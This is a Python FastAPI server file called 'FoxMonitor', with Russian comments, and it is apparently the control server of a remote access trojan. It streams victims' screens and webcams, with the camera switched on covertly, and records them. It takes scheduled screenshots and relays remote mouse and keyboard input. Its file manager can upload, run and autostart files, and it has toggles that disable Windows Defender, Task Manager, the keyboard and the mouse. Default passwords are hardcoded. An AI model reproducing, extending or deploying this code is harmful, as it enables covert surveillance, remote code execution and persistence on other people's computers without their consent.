#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FoxMonitor server.
FastAPI: REST API + WebSocket relay (client <-> web UI) + recording + scheduler.

Run:  pip install -r requirements.txt
      python server.py
"""
import asyncio
import base64
import json
import logging
import os
import secrets
import struct
import sys
import time
import urllib.parse
from collections import deque
from pathlib import Path

import uvicorn
from fastapi import (Depends, FastAPI, File, HTTPException, Header, Request, WebSocket,
                     WebSocketDisconnect)
from fastapi.responses import FileResponse, JSONResponse, Response
from fastapi.staticfiles import StaticFiles

BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"
DATA_DIR = BASE_DIR / "data"
REC_DIR = DATA_DIR / "recordings"
SHOT_DIR = DATA_DIR / "screenshots"
LOG_DIR = DATA_DIR / "logs"

CONFIG_FILE = BASE_DIR / "config.json"

DEFAULTS = {
    "host": "0.0.0.0",
    "port": 8080,
    "client_key": "secret123",
    "users": {"admin": "admin123"},
}

for d in (DATA_DIR, REC_DIR, SHOT_DIR, LOG_DIR):
    d.mkdir(parents=True, exist_ok=True)


def load_config():
    cfg = dict(DEFAULTS)
    if CONFIG_FILE.exists():
        try:
            file_cfg = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
        except Exception:
            file_cfg = {}
        cfg.update(file_cfg)
    # Переменные окружения (Railway) имеют приоритет над config.json.
    if os.environ.get("CLIENT_KEY"):
        cfg["client_key"] = os.environ["CLIENT_KEY"]
    admin_user = os.environ.get("ADMIN_USER")
    admin_pass = os.environ.get("ADMIN_PASS")
    if admin_user or admin_pass:
        users = dict(cfg.get("users", {}))
        if admin_user:
            users[admin_user] = admin_pass or users.get(admin_user, "")
        elif admin_pass:
            # без USER обновляем только пароль существующего (обычно admin)
            for u in users:
                users[u] = admin_pass
        cfg["users"] = users
    return cfg


CFG = load_config()

# ---------------------------------------------------------------- logging --
log_buf = deque(maxlen=500)
_log_fh = logging.FileHandler(LOG_DIR / "server.log", encoding="utf-8")
_log_fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))


class BufHandler(logging.Handler):
    def emit(self, record):
        log_buf.append(self.format(record))


log = logging.getLogger("foxmon")
log.setLevel(logging.INFO)
log.addHandler(_log_fh)
log.addHandler(BufHandler())

# ------------------------------------------------------------------- state --
clients = {}   # id -> dict(ws, ip, connected_at, last_seen, streams)
uis = {}       # ws -> dict(token, name, subs:set[(cid, stream)])
recordings = {}  # (cid, stream) -> dict(path, fh, started, frames)
sessions = {}  # token -> user
scheduler = {"enabled": False, "interval_sec": 300, "last_run": 0.0}
camera_on = {}  # cid -> bool: запрошенное состояние камеры (вкл/выкл)
ui_busy = {}    # ws UI -> bool: медленный браузер пропускает кадры/события, не копит очередь


async def _ui_send(ws2, payload):
    """Фоновая отправка подписчику без засорения очереди медленного браузера."""
    try:
        await ws2.send_json(payload)
    except Exception:
        uis.pop(ws2, None)
    finally:
        ui_busy[ws2] = False

app = FastAPI(title="FoxMonitor")


# ------------------------------------------------------------------ helpers --
def auth_user(authorization: str = Header(default="")) -> str:
    if not authorization.startswith("Bearer "):
        raise HTTPException(401, "missing token")
    token = authorization[7:]
    user = sessions.get(token)
    if not user:
        raise HTTPException(401, "invalid token")
    return user


def client_snapshot(cid, c):
    streams = c.get("streams", {})
    return {
        "id": cid,
        "ip": c.get("ip", ""),
        "connected_at": c.get("connected_at", 0),
        "last_seen": c.get("last_seen", 0),
        "screen": streams.get("screen", False),
        "camera": streams.get("camera", False),
    }


async def broadcast_to_uis(event: dict):
    """Рассылка события без блокировки: медленный браузер не тормозит остальных."""
    for ws in list(uis):
        if ws in ui_busy and ui_busy[ws]:
            continue
        ui_busy[ws] = True
        asyncio.create_task(_ui_send(ws, event))


async def send_to_client(cid, payload):
    c = clients.get(cid)
    if not c:
        raise HTTPException(404, "client not found")
    try:
        await c["ws"].send_text(json.dumps(payload, ensure_ascii=False))
    except Exception as e:
        raise HTTPException(409, f"client unreachable: {e}")


async def sync_camera(cid: str):
    """Камера стримится только пока есть подписчик из UI (вкладка «Камера»)."""
    want = any((cid, "camera") in u["subs"] for u in uis.values())
    if camera_on.get(cid) == want:
        return
    camera_on[cid] = want
    c = clients.get(cid)
    if not c:
        return
    log.info("camera %s: %s", cid, "on" if want else "off")
    try:
        await c["ws"].send_text(json.dumps(
            {"type": "cmd", "command": "start" if want else "stop", "stream": "camera"},
            ensure_ascii=False))
    except Exception:
        pass


# ------------------------------------------------- файловый менеджер --------
# Сервер релеит REST-запрос UI клиенту и ждёт ответ (текстовый fm или
# бинарный кадр kind=4), сопоставляя по req_id.
fm_pending = {}  # req_id -> asyncio.Future


def next_req_id():
    while True:
        r = secrets.randbits(30)
        if r not in fm_pending:
            return r


async def fm_call(cid: str, payload: dict, timeout: float = 6.0):
    """Текстовый запрос файлового менеджера -> ответ клиента (dict)."""
    c = clients.get(cid)
    if not c:
        raise HTTPException(404, "client not found")
    rid = next_req_id()
    fut = asyncio.get_running_loop().create_future()
    fm_pending[rid] = fut
    payload["req_id"] = rid
    try:
        await c["ws"].send_text(json.dumps(payload, ensure_ascii=False))
        return await asyncio.wait_for(fut, timeout)
    except asyncio.TimeoutError:
        raise HTTPException(504, "client timeout")
    finally:
        fm_pending.pop(rid, None)


async def fm_upload_binary(cid: str, path: str, raw: bytes, run: bool,
                           timeout: float = 15.0):
    """Бинарная загрузка файла: kind=5 [req_id][run][path_len][path][data]."""
    c = clients.get(cid)
    if not c:
        raise HTTPException(404, "client not found")
    rid = next_req_id()
    fut = asyncio.get_running_loop().create_future()
    fm_pending[rid] = fut
    pb = path.encode("utf-8")
    payload = struct.pack(">IBI", rid, 1 if run else 0, len(pb)) + pb + raw
    try:
        await c["ws"].send_bytes(struct.pack(">BI", 5, len(payload)) + payload)
        return await asyncio.wait_for(fut, timeout)
    except asyncio.TimeoutError:
        raise HTTPException(504, "client timeout")
    finally:
        fm_pending.pop(rid, None)


# ------------------------------------------------------------------- REST ---
@app.post("/api/login")
async def api_login(body: dict):
    user = body.get("user", "")
    pwd = body.get("pass", "")
    users = CFG.get("users", {})
    if users.get(user) != pwd:
        raise HTTPException(403, "bad credentials")
    token = secrets.token_hex(16)
    sessions[token] = user
    log.info("login: %s", user)
    return {"token": token, "user": user}


@app.get("/api/clients")
async def api_clients(user=Depends(auth_user)):
    return [client_snapshot(cid, c) for cid, c in clients.items()]


@app.get("/api/clients/{cid}/info")
async def api_client_info(cid: str, user=Depends(auth_user)):
    c = clients.get(cid)
    if not c:
        raise HTTPException(404, "client not found")
    return c.get("info") or {}


# ---------------------------------------------------- файловый менеджер ---
@app.post("/api/clients/{cid}/fm/list")
async def fm_list(cid: str, body: dict, user=Depends(auth_user)):
    res = await fm_call(cid, {"type": "cmd", "command": "flist",
                              "path": body.get("path", "")})
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "list failed"))
    return {"entries": res.get("entries", [])}


@app.post("/api/clients/{cid}/fm/download")
async def fm_download(cid: str, body: dict, user=Depends(auth_user)):
    path = body.get("path", "")
    res = await fm_call(cid, {"type": "cmd", "command": "fread",
                              "path": path, "size": 8 << 20})
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "read failed"))
    name = os.path.basename(path.replace("\\", "/")) or "file"
    return Response(content=res["data"], media_type="application/octet-stream",
                    headers={"Content-Disposition": f'attachment; filename="{name}"'})


@app.post("/api/clients/{cid}/fm/upload")
async def fm_upload(cid: str, request: Request, user=Depends(auth_user)):
    raw = await request.body()
    if len(raw) > 4 << 30:
        raise HTTPException(413, "file too large (max 4 GB)")
    path = urllib.parse.unquote(request.headers.get("X-File-Path", ""))
    if not path:
        raise HTTPException(400, "X-File-Path header required")
    run = request.headers.get("X-File-Run", "0") == "1"
    res = await fm_upload_binary(cid, path, raw, run)
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "write failed"))
    log.info("fm upload %s -> %s (run=%s)", cid, path, run)
    return {"ok": True, "path": path, "ran": run}


@app.post("/api/clients/{cid}/fm/run")
async def fm_run(cid: str, body: dict, user=Depends(auth_user)):
    res = await fm_call(cid, {"type": "cmd", "command": "frun",
                              "path": body.get("path", "")})
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "run failed"))
    log.info("fm run %s -> %s", cid, body.get("path", ""))
    return {"ok": True}


@app.post("/api/clients/{cid}/fm/autostart")
async def fm_autostart(cid: str, body: dict, user=Depends(auth_user)):
    res = await fm_call(cid, {"type": "cmd", "command": "fautostart",
                              "path": body.get("path", "")})
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "autostart failed"))
    log.info("fm autostart %s -> %s", cid, body.get("path", ""))
    return {"ok": True}


# ---------------------------------------------- «Прочее»: системные тумблеры --
MISC_FUNCS = {"taskmgr", "defender", "mouse", "clock", "screen", "keyboard", "explorer"}


@app.get("/api/clients/{cid}/misc")
async def misc_status(cid: str, user=Depends(auth_user)):
    """Текущее состояние тумблеров вкладки «Прочее» (хранится в памяти клиента)."""
    res = await fm_call(cid, {"type": "cmd", "command": "miscstatus"}, timeout=5.0)
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "misc status failed"))
    return res.get("states", {})


@app.post("/api/clients/{cid}/misc/{func}")
async def misc_toggle(cid: str, func: str, body: dict, user=Depends(auth_user)):
    """Включить/выключить системную функцию на машине клиента."""
    if func not in MISC_FUNCS:
        raise HTTPException(400, "unknown misc function")
    on = bool(body.get("on", False))
    # PnP-отключение мыши/клавиатуры и Defender бывают небыстрыми — запас таймаута.
    res = await fm_call(cid, {"type": "cmd", "command": "misc", "func": func, "on": on},
                        timeout=30.0)
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "misc failed"))
    log.info("misc %s %s -> %s", func, "ON" if on else "OFF", cid)
    return {"ok": True, "func": func, "on": on}
@app.post("/api/clients/{cid}/misc/killtaskmgr")
async def misc_killtaskmgr(cid: str, user=Depends(auth_user)):
    """Закрыть диспетчер задач на клиенте (без изменения состояния)."""
    res = await fm_call(cid, {"type": "cmd", "command": "killtaskmgr"}, timeout=10.0)
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "killtaskmgr failed"))
    log.info("killtaskmgr -> %s", cid)
    return {"ok": True}



@app.post("/api/clients/{cid}/fm/delete")
async def fm_delete(cid: str, body: dict, user=Depends(auth_user)):
    res = await fm_call(cid, {"type": "cmd", "command": "fdel",
                              "path": body.get("path", "")})
    if not res.get("ok"):
        raise HTTPException(400, res.get("error", "delete failed"))
    return {"ok": True}


@app.get("/api/me")
async def api_me(user=Depends(auth_user)):
    return {"user": user}


@app.get("/health")
async def api_health():
    """Healthcheck для Railway: без авторизации, отдаёт статус и число клиентов."""
    return {"ok": True, "clients": len(clients)}


@app.post("/api/clients/{cid}/command")
async def api_command(cid: str, body: dict, user=Depends(auth_user)):
    command = body.get("command")
    stream = body.get("stream", "screen")
    value = body.get("value")
    if command not in ("start", "stop", "quality", "setfps", "screenshot"):
        raise HTTPException(400, "unknown command")
    payload = {"type": "cmd", "command": command, "stream": stream}
    if command == "quality" and value is not None:
        payload["value"] = max(5, min(100, int(value)))
    if command == "setfps" and value is not None:
        payload["value"] = max(1, min(60, int(value)))
    await send_to_client(cid, payload)
    log.info("cmd %s -> %s: %s", command, cid, payload)
    return {"ok": True, "sent": payload}


@app.post("/api/clients/{cid}/record")
async def api_record(cid: str, body: dict, user=Depends(auth_user)):
    stream = body.get("stream", "screen")
    action = body.get("action", "start")
    if stream not in ("screen", "camera"):
        raise HTTPException(400, "bad stream")
    key = (cid, stream)
    if action == "start":
        if key in recordings:
            return {"ok": False, "error": "already recording"}
        ts = time.strftime("%Y%m%d_%H%M%S")
        fname = f"{cid}_{stream}_{ts}.mjpeg"
        path = REC_DIR / fname
        fh = open(path, "wb")
        recordings[key] = {"path": path, "fh": fh, "started": time.time(), "frames": 0}
        log.info("record start: %s", fname)
        await broadcast_to_uis({"type": "recording", "cid": cid, "stream": stream,
                                "state": "started", "file": fname})
        return {"ok": True, "file": fname}
    if key in recordings:
        rec = recordings.pop(key)
        rec["fh"].close()
        log.info("record stop: %s (%d frames)", rec["path"].name, rec["frames"])
        await broadcast_to_uis({"type": "recording", "cid": cid, "stream": stream,
                                "state": "stopped", "file": rec["path"].name})
        return {"ok": True, "file": rec["path"].name, "frames": rec["frames"]}
    return {"ok": False, "error": "not recording"}


@app.get("/api/recordings")
async def api_recordings(user=Depends(auth_user)):
    out = []
    for p in sorted(REC_DIR.glob("*.mjpeg"), reverse=True):
        st = p.stat()
        out.append({"name": p.name, "size": st.st_size, "mtime": st.st_mtime})
    return out


@app.get("/api/recordings/{name}")
async def api_recording_download(name: str, user=Depends(auth_user)):
    path = REC_DIR / name
    if not path.exists() or not path.is_file():
        raise HTTPException(404, "no such recording")
    return FileResponse(path, media_type="video/x-mjpeg")


@app.get("/api/screenshots")
async def api_screenshots(user=Depends(auth_user)):
    out = []
    for p in sorted(SHOT_DIR.glob("*.jpg"), reverse=True):
        st = p.stat()
        out.append({"name": p.name, "size": st.st_size, "mtime": st.st_mtime})
    return out


@app.get("/api/screenshots/{name}")
async def api_screenshot_download(name: str, user=Depends(auth_user)):
    path = SHOT_DIR / name
    if not path.exists() or not path.is_file():
        raise HTTPException(404, "no such screenshot")
    return FileResponse(path, media_type="image/jpeg")


@app.get("/api/scheduler")
async def api_scheduler_get(user=Depends(auth_user)):
    return {"enabled": scheduler["enabled"], "interval_sec": scheduler["interval_sec"]}


@app.post("/api/scheduler")
async def api_scheduler_set(body: dict, user=Depends(auth_user)):
    scheduler["enabled"] = bool(body.get("enabled", False))
    iv = int(body.get("interval_sec", 300))
    scheduler["interval_sec"] = max(30, min(86400, iv))
    log.info("scheduler: %s every %ds", scheduler["enabled"], scheduler["interval_sec"])
    return scheduler


@app.get("/api/logs")
async def api_logs(n: int = 200, user=Depends(auth_user)):
    return list(log_buf)[-n:]


# ------------------------------------------------------------- WS: client ---
def parse_client_frame(raw: bytes):
    """kind = msg[0]: 1 screen, 2 camera, 3 screenshot, 4 file data (fm).
    len = BE uint32 [1:5]."""
    if len(raw) < 5:
        return None
    kind = raw[0]
    length = int.from_bytes(raw[1:5], "big")
    if 5 + length > len(raw):
        return None
    return kind, raw[5:5 + length]


@app.websocket("/ws/client")
async def ws_client(ws: WebSocket):
    await ws.accept()
    cid = None
    try:
        hello = await asyncio.wait_for(ws.receive_json(), timeout=10)
        if hello.get("type") != "hello" or hello.get("key") != CFG["client_key"]:
            await ws.close(code=1008)
            return
        cid = str(hello.get("id", "unknown"))
        peer = ws.client.host if ws.client else ""
        clients[cid] = {
            "ws": ws,
            "ip": peer,
            "connected_at": time.time(),
            "last_seen": time.time(),
            "streams": {"screen": False, "camera": False},
        }
        camera_on[cid] = False
        log.info("client online: %s (%s)", cid, peer)
        await broadcast_to_uis({"type": "client_event", "event": "joined",
                                "client": client_snapshot(cid, clients[cid])})

        while True:
            msg = await ws.receive()
            if msg["type"] == "websocket.disconnect":
                log.info("client ws disconnect %s: code=%s", cid, msg.get("code"))
                break
            clients[cid]["last_seen"] = time.time()

            if msg["type"] == "websocket.receive" and "text" in msg:
                try:
                    evt = json.loads(msg["text"])
                except Exception:
                    continue
                if evt.get("type") == "status":
                    st = evt.get("streams", {})
                    clients[cid]["streams"]["screen"] = bool(st.get("screen", False))
                    clients[cid]["streams"]["camera"] = bool(st.get("camera", False))
                    await broadcast_to_uis({"type": "client_event", "event": "status",
                                            "client": client_snapshot(cid, clients[cid])})
                if evt.get("type") == "info":
                    clients[cid]["info"] = evt
                    await broadcast_to_uis({"type": "info", "cid": cid, "info": evt})
                if evt.get("type") == "fm":
                    fut = fm_pending.get(evt.get("req_id"))
                    if fut and not fut.done():
                        fut.set_result(evt)

            if msg["type"] == "websocket.receive" and "bytes" in msg:
                frame = parse_client_frame(msg["bytes"])
                if not frame:
                    continue
                kind, data = frame
                if kind == 3:
                    stream = "screen" if (len(data) and data[0] == 1) else "camera"
                    ts = time.strftime("%Y%m%d_%H%M%S")
                    fname = f"{cid}_{stream}_{ts}.jpg"
                    (SHOT_DIR / fname).write_bytes(data[1:] if data[:1] else data)
                    log.info("screenshot saved: %s", fname)
                    await broadcast_to_uis({"type": "screenshot_saved", "cid": cid,
                                            "stream": stream, "file": fname})
                elif kind == 4:
                    # файл файлового менеджера: [req_id BE32][size BE32][data]
                    if len(data) >= 8:
                        rid = int.from_bytes(data[:4], "big")
                        fut = fm_pending.get(rid)
                        if fut and not fut.done():
                            fut.set_result({"ok": True, "data": data[8:]})
                else:
                    stream = "screen" if kind == 1 else "camera"
                    c = clients[cid]
                    c.setdefault("last_frame", {})[stream] = {"data": data, "ts": time.time()}
                    rec = recordings.get((cid, stream))
                    if rec:
                        rec["fh"].write(data)
                        rec["frames"] += 1
                    for ws2, u in list(uis.items()):
                        if (cid, stream) in u["subs"] and not ui_busy.get(ws2, False):
                            ui_busy[ws2] = True
                            asyncio.create_task(_ui_send(ws2, {
                                "type": "frame", "cid": cid, "stream": stream,
                                "ts": time.time(),
                                "data": base64.b64encode(data).decode("ascii"),
                            }))
    except (WebSocketDisconnect, asyncio.CancelledError, Exception) as e:
        if isinstance(e, Exception) and not isinstance(e, WebSocketDisconnect):
            log.warning("client ws error %s: %r", cid, e)
        else:
            log.info("client ws end %s: %r", cid, e)
    finally:
        if cid and clients.get(cid):
            clients.pop(cid, None)
            camera_on.pop(cid, None)
            log.info("client offline: %s", cid)
            await broadcast_to_uis({"type": "client_event", "event": "left", "client": {"id": cid}})
        try:
            await ws.close()
        except Exception:
            pass


# ---------------------------------------------------------------- WS: UI ---
@app.websocket("/ws/ui")
async def ws_ui(ws: WebSocket):
    await ws.accept()
    authed = False
    try:
        first = await asyncio.wait_for(ws.receive_json(), timeout=10)
        if first.get("type") != "auth" or sessions.get(first.get("token")) is None:
            await ws.close(code=1008)
            return
        authed = True
        uis[ws] = {"token": first["token"], "subs": set()}
        await ws.send_json({"type": "clients",
                            "clients": [client_snapshot(cid, c) for cid, c in clients.items()]})
        while True:
            msg = await ws.receive_json()
            t = msg.get("type")
            if t == "subscribe":
                cid, stream = msg.get("cid"), msg.get("stream")
                if cid and stream in ("screen", "camera") and cid in clients:
                    uis[ws]["subs"].add((cid, stream))
                    if stream == "camera":
                        await sync_camera(cid)
                    lf = clients[cid].get("last_frame", {}).get(stream)
                    if lf:
                        await ws.send_json({"type": "frame", "cid": cid, "stream": stream,
                                            "ts": lf["ts"],
                                            "data": base64.b64encode(lf["data"]).decode("ascii")})
            elif t == "unsubscribe":
                cid, stream = msg.get("cid"), msg.get("stream")
                uis[ws]["subs"].discard((cid, stream))
                if stream == "camera":
                    await sync_camera(cid)
            elif t == "input":
                # транзит удалённого управления: UI -> сервер -> клиент
                cid = msg.get("cid")
                if cid and cid in clients:
                    try:
                        await clients[cid]["ws"].send_text(json.dumps({
                            "type": "input",
                            "kind": msg.get("kind"),
                            "x": msg.get("x"),
                            "y": msg.get("y"),
                            "button": msg.get("button"),
                            "delta": msg.get("delta"),
                            "key": msg.get("key"),
                            "down": msg.get("down"),
                        }, ensure_ascii=False))
                    except Exception:
                        pass
    except (WebSocketDisconnect, asyncio.CancelledError, Exception) as e:
        if isinstance(e, Exception) and not isinstance(e, WebSocketDisconnect):
            log.warning("ui ws error: %r", e)
    finally:
        cids = {cid for (cid, s) in uis.get(ws, {}).get("subs", set()) if s == "camera"}
        uis.pop(ws, None)
        for cid in cids:
            await sync_camera(cid)
        try:
            await ws.close()
        except Exception:
            pass


# --------------------------------------------------------------- scheduler --
async def scheduler_loop():
    while True:
        await asyncio.sleep(15)
        if not scheduler["enabled"]:
            continue
        now = time.time()
        if now - scheduler["last_run"] < scheduler["interval_sec"]:
            continue
        scheduler["last_run"] = now
        for cid in list(clients.keys()):
            try:
                await send_to_client(cid, {"type": "cmd", "command": "screenshot",
                                           "stream": "screen"})
                log.info("scheduler: screenshot -> %s", cid)
            except HTTPException:
                pass


@app.on_event("startup")
async def on_startup():
    asyncio.create_task(scheduler_loop())


# --------------------------------------------------------------- static ----
app.mount("/", StaticFiles(directory=str(STATIC_DIR), html=True), name="static")

if __name__ == "__main__":
    # Railway/Heroku передают порт через переменную окружения PORT.
    port = int(os.environ.get("PORT", CFG["port"]))
    host = os.environ.get("HOST", CFG["host"])
    uvicorn.run(app, host=host, port=port, log_level="info",
                ws_max_size=4 << 30, ws_max_queue=512)
